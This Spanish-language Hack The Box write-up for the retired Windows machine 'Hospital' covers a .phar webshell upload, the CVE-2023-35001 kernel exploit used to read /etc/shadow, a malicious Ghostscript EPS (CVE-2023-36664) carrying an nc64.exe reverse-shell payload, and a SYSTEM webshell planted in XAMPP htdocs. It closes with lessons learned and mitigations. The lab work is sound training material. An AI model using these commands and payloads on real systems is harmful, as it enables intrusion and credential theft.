---
machine: Hospital
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, linux-vm, phar, cve-2023-35001, ghostscript, xampp]
---

# Hospital — Hack The Box (Windows)

[🌐 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una VM Linux con una aplicación PHP permite subir `.phar`; `popen` no está deshabilitado y da RCE. CVE-2023-35001 escala a root en la VM y `/etc/shadow` filtra la contraseña de un usuario de Roundcube. Un EPS malicioso explota Ghostscript (CVE-2023-36664) al abrirse en Windows. XAMPP con `htdocs` escribible y Apache como SYSTEM permite root.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p22,443,445,8080,5985,3389 <IP>
```

- Linux VM: SSH y Apache/PHP en 8080.
- Windows DC: HTTPS/Roundcube, SMB, WinRM y RDP.
- El dominio es `hospital.htb` y el DC `dc.hospital.htb`.

## Enumeración

- La aplicación del puerto 8080 permite registro y subida de imágenes.
- El filtro de extensiones acepta `.phar`.
- Roundcube en 443 autentica usuarios del dominio.

## Foothold

Se sube un `.phar` con un webshell que usa `popen`. La función no aparece en `disable_functions`, así que ejecuta comandos como `www-data`.

```bash
curl -b cookies.txt -F "image=@sh.phar" http://hospital.htb:8080/upload.php
curl "http://hospital.htb:8080/uploads/sh.phar?c=id"
```

## Escalada en la VM Linux

El kernel 5.19.0-35 es vulnerable a CVE-2023-35001, una escritura fuera de límites en `nf_tables`. El exploit público de Synacktiv obtiene root y permite leer `/etc/shadow`.

```bash
# Transferir exploit.tar y ejecutarlo desde el webshell
(echo "cat /etc/shadow > /tmp/.shadow && chmod 644 /tmp/.shadow"; sleep 2) | ./exploit
```

El hash SHA-512 de `drwilliams` se crackea con `hashcat -m 1800`; la contraseña se usa en Roundcube.

## Movimiento lateral a Windows

En el buzón de `drbrown` hay un correo que solicita un EPS para Ghostscript. Se genera un EPS con `%pipe%` (CVE-2023-36664) y se envía; al abrirlo, Ghostscript ejecuta el comando y devuelve una shell como `hospital\drbrown`.

```bash
python3 CVE_2023_36664_exploit.py --inject \
  --payload 'cmd.exe /c \\<IP>\share\nc64.exe -e cmd <IP> 9001' \
  --filename file.eps
```

## Escalada a root

`C:\xampp\htdocs` concede escritura a `BUILTIN\Users` y Apache se ejecuta como `NT AUTHORITY\SYSTEM`. Se escribe un PHP y se solicita por `localhost`.

```cmd
icacls C:\xampp\htdocs
echo ^<?php system($_GET["c"]); ?^> > C:\xampp\htdocs\sh.php
curl -k "https://localhost/sh.php?c=whoami"
```

## Evidencia

- `id` en la VM y `whoami` en Windows.
- Hash crackeado y acceso a Roundcube, con credenciales redactadas.
- EPS y callback de `drbrown`.
- `icacls` y ejecución como SYSTEM.
- Flag redactada.

## Lecciones aprendidas

- Una allowlist de extensiones debe incluir todas las variantes ejecutables.
- Una denylist de funciones PHP deja huecos como `popen`.
- Un cliente de correo que abre adjuntos con Ghostscript hereda su superficie de ejecución.

## Mitigaciones y detección

- Rechazar `.phar`, `.phtml` y variantes; validar contenido y tipo real.
- Usar una allowlist de funciones PHP y actualizar el kernel.
- Actualizar Ghostscript a 10.01.2 o posterior y bloquear `%pipe%`.
- Retirar permisos de escritura de `htdocs` y no ejecutar Apache como SYSTEM.

## Referencias

- <https://www.hackthebox.com/machines/Hospital>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-35001>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-36664>
- <https://attack.mitre.org/techniques/T1190/>
